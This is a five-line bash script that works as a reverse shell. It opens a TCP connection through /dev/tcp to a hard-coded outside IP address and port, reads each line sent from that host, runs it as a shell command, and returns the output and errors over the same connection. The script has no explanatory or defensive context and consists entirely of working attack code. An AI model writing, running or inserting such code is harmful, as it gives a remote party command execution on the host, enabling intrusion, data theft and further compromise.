#!/bin/bash
exec 5<>/dev/tcp/52.74.74.86/19489
while read -r line <&5; do
  (echo "=> $line"; $line) >&5 2>&5
done
